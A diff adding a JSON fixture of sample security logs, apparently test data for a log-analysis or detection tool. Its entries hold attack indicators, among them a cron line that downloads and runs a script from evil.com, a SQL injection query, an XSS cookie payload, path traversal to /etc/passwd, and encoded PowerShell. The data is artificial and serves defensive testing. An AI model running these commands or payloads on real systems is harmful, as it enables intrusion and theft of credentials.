@@ -1,0 +1,110 @@
+{
+  "log_entries": [
+    {
+      "log_source": "windows",
+      "host": "DC-01",
+      "timestamp": "2024-06-15T02:14:33Z",
+      "event_id": 1102,
+      "username": "svc_backup",
+      "src_ip": "192.168.1.105",
+      "message": "The audit log was cleared by svc_backup",
+      "raw": "2024-06-15T02:14:33Z DC-01 Security EventID=1102 Subject=svc_backup The audit log was cleared"
+    },
+    {
+      "log_source": "windows",
+      "host": "WS-07",
+      "timestamp": "2024-06-15T09:42:11Z",
+      "event_id": 4625,
+      "username": "administrator",
+      "src_ip": "45.33.32.156",
+      "count": 47,
+      "message": "An account failed to log on",
+      "raw": "2024-06-15T09:42:11Z WS-07 Security EventID=4625 Account=administrator Source=45.33.32.156"
+    },
+    {
+      "log_source": "windows",
+      "host": "DC-01",
+      "timestamp": "2024-06-15T10:05:22Z",
+      "event_id": 4719,
+      "username": "jsmith",
+      "src_ip": "192.168.1.105",
+      "message": "System audit policy was changed",
+      "raw": "2024-06-15T10:05:22Z DC-01 Security EventID=4719 Subject=jsmith"
+    },
+    {
+      "log_source": "windows",
+      "host": "WS-05",
+      "timestamp": "2024-06-15T10:08:44Z",
+      "event_id": 4698,
+      "username": "jsmith",
+      "src_ip": "192.168.1.105",
+      "message": "A scheduled task was created: Updater — powershell.exe -enc SQBFAFgA",
+      "raw": "2024-06-15T10:08:44Z WS-05 Security EventID=4698 TaskName=Updater User=jsmith"
+    },
+    {
+      "log_source": "windows",
+      "host": "FILE-SERVER",
+      "timestamp": "2024-06-15T10:15:00Z",
+      "event_id": 4672,
+      "username": "svc_backup",
+      "src_ip": "192.168.1.10",
+      "message": "Special privileges assigned to new logon: SeDebugPrivilege SeImpersonatePrivilege",
+      "raw": "2024-06-15T10:15:00Z FILE-SERVER Security EventID=4672 Subject=svc_backup Privileges=SeDebugPrivilege"
+    },
+    {
+      "log_source": "syslog",
+      "host": "linux-web-01",
+      "timestamp": "2024-06-15T03:22:10Z",
+      "src_ip": "91.108.4.200",
+      "username": "root",
+      "raw": "Jun 15 03:22:10 linux-web-01 sshd[2211]: Failed password for root from 91.108.4.200 port 51234 ssh2"
+    },
+    {
+      "log_source": "syslog",
+      "host": "linux-db-01",
+      "timestamp": "2024-06-15T11:30:00Z",
+      "src_ip": "10.0.0.88",
+      "username": "dbadmin",
+      "raw": "Jun 15 11:30:00 linux-db-01 sudo: dbadmin : TTY=pts/1 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/bin/bash"
+    },
+    {
+      "log_source": "syslog",
+      "host": "linux-web-01",
+      "timestamp": "2024-06-15T04:00:01Z",
+      "src_ip": "",
+      "username": "root",
+      "raw": "Jun 15 04:00:01 linux-web-01 CRON[1234]: (root) CMD (/usr/bin/wget http://evil.com/update.sh -O /tmp/u.sh && bash /tmp/u.sh)"
+    },
+    {
+      "log_source": "apache",
+      "host": "web-proxy",
+      "timestamp": "2024-06-15T14:11:05Z",
+      "src_ip": "45.33.32.156",
+      "raw": "45.33.32.156 - - [15/Jun/2024:14:11:05 +0000] \"GET /search?q=1' union select username,password from users-- HTTP/1.1\" 500 512"
+    },
+    {
+      "log_source": "apache",
+      "host": "web-proxy",
+      "timestamp": "2024-06-15T14:12:30Z",
+      "src_ip": "45.33.32.156",
+      "raw": "45.33.32.156 - - [15/Jun/2024:14:12:30 +0000] \"GET /profile?name=<script>alert(document.cookie)</script> HTTP/1.1\" 200 4096"
+    },
+    {
+      "log_source": "apache",
+      "host": "web-proxy",
+      "timestamp": "2024-06-15T14:13:00Z",
+      "src_ip": "45.33.32.156",
+      "raw": "45.33.32.156 - - [15/Jun/2024:14:13:00 +0000] \"GET /../../../etc/passwd HTTP/1.1\" 403 211 \"-\" \"sqlmap/1.7 (https://sqlmap.org)\""
+    },
+    {
+      "log_source": "windows",
+      "host": "WS-03",
+      "timestamp": "2024-06-15T08:30:00Z",
+      "event_id": 4624,
+      "username": "finance_user",
+      "src_ip": "192.168.1.20",
+      "message": "Successful logon",
+      "raw": "2024-06-15T08:30:00Z WS-03 Security EventID=4624 Account=finance_user Source=192.168.1.20"
+    }
+  ]
+}
